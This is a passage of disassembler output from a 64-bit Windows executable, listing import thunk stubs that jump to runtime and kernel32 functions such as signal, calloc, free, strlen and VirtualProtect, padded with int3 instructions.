   1400055df:	cc                   	int3

00000001400055e0 <signal>:
   1400055e0:	ff 25 12 27 07 00    	jmp    *0x72712(%rip)        # 140077cf8 <__imp_signal>
   1400055e6:	cc                   	int3
   1400055e7:	cc                   	int3
   1400055e8:	cc                   	int3
   1400055e9:	cc                   	int3
   1400055ea:	cc                   	int3
   1400055eb:	cc                   	int3
   1400055ec:	cc                   	int3
   1400055ed:	cc                   	int3
   1400055ee:	cc                   	int3
   1400055ef:	cc                   	int3

00000001400055f0 <__setusermatherr>:
   1400055f0:	ff 25 8a 27 07 00    	jmp    *0x7278a(%rip)        # 140077d80 <__imp___setusermatherr>
   1400055f6:	cc                   	int3
   1400055f7:	cc                   	int3
   1400055f8:	cc                   	int3
   1400055f9:	cc                   	int3
   1400055fa:	cc                   	int3
   1400055fb:	cc                   	int3
   1400055fc:	cc                   	int3
   1400055fd:	cc                   	int3
   1400055fe:	cc                   	int3
   1400055ff:	cc                   	int3

0000000140005600 <__acrt_iob_func>:
   140005600:	ff 25 5a 26 07 00    	jmp    *0x7265a(%rip)        # 140077c60 <__imp___acrt_iob_func>
   140005606:	cc                   	int3
   140005607:	cc                   	int3
   140005608:	cc                   	int3
   140005609:	cc                   	int3
   14000560a:	cc                   	int3
   14000560b:	cc                   	int3
   14000560c:	cc                   	int3
   14000560d:	cc                   	int3
   14000560e:	cc                   	int3
   14000560f:	cc                   	int3
   140005610:	ff 25 52 24 07 00    	jmp    *0x72452(%rip)        # 140077a68 <__imp_VirtualProtect>
   140005616:	cc                   	int3
   140005617:	cc                   	int3
   140005618:	cc                   	int3
   140005619:	cc                   	int3
   14000561a:	cc                   	int3
   14000561b:	cc                   	int3
   14000561c:	cc                   	int3
   14000561d:	cc                   	int3
   14000561e:	cc                   	int3
   14000561f:	cc                   	int3
   140005620:	ff 25 4a 24 07 00    	jmp    *0x7244a(%rip)        # 140077a70 <__imp_VirtualQuery>
   140005626:	cc                   	int3
   140005627:	cc                   	int3
   140005628:	cc                   	int3
   140005629:	cc                   	int3
   14000562a:	cc                   	int3
   14000562b:	cc                   	int3
   14000562c:	cc                   	int3
   14000562d:	cc                   	int3
   14000562e:	cc                   	int3
   14000562f:	cc                   	int3

0000000140005630 <abort>:
   140005630:	ff 25 b2 26 07 00    	jmp    *0x726b2(%rip)        # 140077ce8 <__imp_abort>
   140005636:	cc                   	int3
   140005637:	cc                   	int3
   140005638:	cc                   	int3
   140005639:	cc                   	int3
   14000563a:	cc                   	int3
   14000563b:	cc                   	int3
   14000563c:	cc                   	int3
   14000563d:	cc                   	int3
   14000563e:	cc                   	int3
   14000563f:	cc                   	int3

0000000140005640 <__p__wcmdln>:
   140005640:	ff 25 52 26 07 00    	jmp    *0x72652(%rip)        # 140077c98 <__imp___p__wcmdln>
   140005646:	cc                   	int3
   140005647:	cc                   	int3
   140005648:	cc                   	int3
   140005649:	cc                   	int3
   14000564a:	cc                   	int3
   14000564b:	cc                   	int3
   14000564c:	cc                   	int3
   14000564d:	cc                   	int3
   14000564e:	cc                   	int3
   14000564f:	cc                   	int3
   140005650:	ff 25 aa 23 07 00    	jmp    *0x723aa(%rip)        # 140077a00 <__imp_GetStartupInfoW>
   140005656:	cc                   	int3
   140005657:	cc                   	int3
   140005658:	cc                   	int3
   140005659:	cc                   	int3
   14000565a:	cc                   	int3
   14000565b:	cc                   	int3
   14000565c:	cc                   	int3
   14000565d:	cc                   	int3
   14000565e:	cc                   	int3
   14000565f:	cc                   	int3

0000000140005660 <__set_app_type>:
   140005660:	ff 25 72 26 07 00    	jmp    *0x72672(%rip)        # 140077cd8 <__imp__set_app_type>
   140005666:	cc                   	int3
   140005667:	cc                   	int3
   140005668:	cc                   	int3
   140005669:	cc                   	int3
   14000566a:	cc                   	int3
   14000566b:	cc                   	int3
   14000566c:	cc                   	int3
   14000566d:	cc                   	int3
   14000566e:	cc                   	int3
   14000566f:	cc                   	int3

0000000140005670 <_initialize_wide_environment>:
   140005670:	ff 25 4a 26 07 00    	jmp    *0x7264a(%rip)        # 140077cc0 <__imp__initialize_wide_environment>
   140005676:	cc                   	int3
   140005677:	cc                   	int3
   140005678:	cc                   	int3
   140005679:	cc                   	int3
   14000567a:	cc                   	int3
   14000567b:	cc                   	int3
   14000567c:	cc                   	int3
   14000567d:	cc                   	int3
   14000567e:	cc                   	int3
   14000567f:	cc                   	int3

0000000140005680 <_configure_wide_argv>:
   140005680:	ff 25 22 26 07 00    	jmp    *0x72622(%rip)        # 140077ca8 <__imp__configure_wide_argv>
   140005686:	cc                   	int3
   140005687:	cc                   	int3
   140005688:	cc                   	int3
   140005689:	cc                   	int3
   14000568a:	cc                   	int3
   14000568b:	cc                   	int3
   14000568c:	cc                   	int3
   14000568d:	cc                   	int3
   14000568e:	cc                   	int3
   14000568f:	cc                   	int3

0000000140005690 <__p___argc>:
   140005690:	ff 25 f2 25 07 00    	jmp    *0x725f2(%rip)        # 140077c88 <__imp___p___argc>
   140005696:	cc                   	int3
   140005697:	cc                   	int3
   140005698:	cc                   	int3
   140005699:	cc                   	int3
   14000569a:	cc                   	int3
   14000569b:	cc                   	int3
   14000569c:	cc                   	int3
   14000569d:	cc                   	int3
   14000569e:	cc                   	int3
   14000569f:	cc                   	int3

00000001400056a0 <__p___wargv>:
   1400056a0:	ff 25 ea 25 07 00    	jmp    *0x725ea(%rip)        # 140077c90 <__imp___p___wargv>
   1400056a6:	cc                   	int3
   1400056a7:	cc                   	int3
   1400056a8:	cc                   	int3
   1400056a9:	cc                   	int3
   1400056aa:	cc                   	int3
   1400056ab:	cc                   	int3
   1400056ac:	cc                   	int3
   1400056ad:	cc                   	int3
   1400056ae:	cc                   	int3
   1400056af:	cc                   	int3

00000001400056b0 <__p__wenviron>:
   1400056b0:	ff 25 da 26 07 00    	jmp    *0x726da(%rip)        # 140077d90 <__imp___p__wenviron>
   1400056b6:	cc                   	int3
   1400056b7:	cc                   	int3
   1400056b8:	cc                   	int3
   1400056b9:	cc                   	int3
   1400056ba:	cc                   	int3
   1400056bb:	cc                   	int3
   1400056bc:	cc                   	int3
   1400056bd:	cc                   	int3
   1400056be:	cc                   	int3
   1400056bf:	cc                   	int3

00000001400056c0 <_set_new_mode>:
   1400056c0:	ff 25 52 26 07 00    	jmp    *0x72652(%rip)        # 140077d18 <__imp__set_new_mode>
   1400056c6:	cc                   	int3
   1400056c7:	cc                   	int3
   1400056c8:	cc                   	int3
   1400056c9:	cc                   	int3
   1400056ca:	cc                   	int3
   1400056cb:	cc                   	int3
   1400056cc:	cc                   	int3
   1400056cd:	cc                   	int3
   1400056ce:	cc                   	int3
   1400056cf:	cc                   	int3

00000001400056d0 <_exit>:
   1400056d0:	ff 25 e2 25 07 00    	jmp    *0x725e2(%rip)        # 140077cb8 <__imp__exit>
   1400056d6:	cc                   	int3
   1400056d7:	cc                   	int3
   1400056d8:	cc                   	int3
   1400056d9:	cc                   	int3
   1400056da:	cc                   	int3
   1400056db:	cc                   	int3
   1400056dc:	cc                   	int3
   1400056dd:	cc                   	int3
   1400056de:	cc                   	int3
   1400056df:	cc                   	int3

00000001400056e0 <calloc>:
   1400056e0:	ff 25 3a 26 07 00    	jmp    *0x7263a(%rip)        # 140077d20 <__imp_calloc>
   1400056e6:	cc                   	int3
   1400056e7:	cc                   	int3
   1400056e8:	cc                   	int3
   1400056e9:	cc                   	int3
   1400056ea:	cc                   	int3
   1400056eb:	cc                   	int3
   1400056ec:	cc                   	int3
   1400056ed:	cc                   	int3
   1400056ee:	cc                   	int3
   1400056ef:	cc                   	int3
   1400056f0:	ff 25 ba 22 07 00    	jmp    *0x722ba(%rip)        # 1400779b0 <__imp_EnterCriticalSection>
   1400056f6:	cc                   	int3
   1400056f7:	cc                   	int3
   1400056f8:	cc                   	int3
   1400056f9:	cc                   	int3
   1400056fa:	cc                   	int3
   1400056fb:	cc                   	int3
   1400056fc:	cc                   	int3
   1400056fd:	cc                   	int3
   1400056fe:	cc                   	int3
   1400056ff:	cc                   	int3
   140005700:	ff 25 32 23 07 00    	jmp    *0x72332(%rip)        # 140077a38 <__imp_LeaveCriticalSection>
   140005706:	cc                   	int3
   140005707:	cc                   	int3
   140005708:	cc                   	int3
   140005709:	cc                   	int3
   14000570a:	cc                   	int3
   14000570b:	cc                   	int3
   14000570c:	cc                   	int3
   14000570d:	cc                   	int3
   14000570e:	cc                   	int3
   14000570f:	cc                   	int3

0000000140005710 <free>:
   140005710:	ff 25 12 26 07 00    	jmp    *0x72612(%rip)        # 140077d28 <__imp_free>
   140005716:	cc                   	int3
   140005717:	cc                   	int3
   140005718:	cc                   	int3
   140005719:	cc                   	int3
   14000571a:	cc                   	int3
   14000571b:	cc                   	int3
   14000571c:	cc                   	int3
   14000571d:	cc                   	int3
   14000571e:	cc                   	int3
   14000571f:	cc                   	int3
   140005720:	ff 25 3a 23 07 00    	jmp    *0x7233a(%rip)        # 140077a60 <__imp_TlsGetValue>
   140005726:	cc                   	int3
   140005727:	cc                   	int3
   140005728:	cc                   	int3
   140005729:	cc                   	int3
   14000572a:	cc                   	int3
   14000572b:	cc                   	int3
   14000572c:	cc                   	int3
   14000572d:	cc                   	int3
   14000572e:	cc                   	int3
   14000572f:	cc                   	int3
   140005730:	ff 25 fa 22 07 00    	jmp    *0x722fa(%rip)        # 140077a30 <__imp_InitializeCriticalSection>
   140005736:	cc                   	int3
   140005737:	cc                   	int3
   140005738:	cc                   	int3
   140005739:	cc                   	int3
   14000573a:	cc                   	int3
   14000573b:	cc                   	int3
   14000573c:	cc                   	int3
   14000573d:	cc                   	int3
   14000573e:	cc                   	int3
   14000573f:	cc                   	int3
   140005740:	ff 25 5a 22 07 00    	jmp    *0x7225a(%rip)        # 1400779a0 <__imp_DeleteCriticalSection>
   140005746:	cc                   	int3
   140005747:	cc                   	int3
   140005748:	cc                   	int3
   140005749:	cc                   	int3
   14000574a:	cc                   	int3
   14000574b:	cc                   	int3
   14000574c:	cc                   	int3
   14000574d:	cc                   	int3
   14000574e:	cc                   	int3
   14000574f:	cc                   	int3

0000000140005750 <__stdio_common_vfprintf>:
   140005750:	ff 25 22 25 07 00    	jmp    *0x72522(%rip)        # 140077c78 <__imp___stdio_common_vfprintf>
   140005756:	cc                   	int3
   140005757:	cc                   	int3
   140005758:	cc                   	int3
   140005759:	cc                   	int3
   14000575a:	cc                   	int3
   14000575b:	cc                   	int3
   14000575c:	cc                   	int3
   14000575d:	cc                   	int3
   14000575e:	cc                   	int3
   14000575f:	cc                   	int3

0000000140005760 <strlen>:
   140005760:	ff 25 f2 25 07 00    	jmp    *0x725f2(%rip)        # 140077d58 <__imp_strlen>
   140005766:	cc                   	int3
   140005767:	cc                   	int3
   140005768:	cc                   	int3
   140005769:	cc                   	int3
   14000576a:	cc                   	int3
   14000576b:	cc                   	int3
   14000576c:	cc                   	int3
   14000576d:	cc                   	int3
   14000576e:	cc                   	int3
   14000576f:	cc                   	int3

0000000140005770 <strncmp>:
   140005770:	ff 25 ea 25 07 00    	jmp    *0x725ea(%rip)        # 140077d60 <__imp_strncmp>
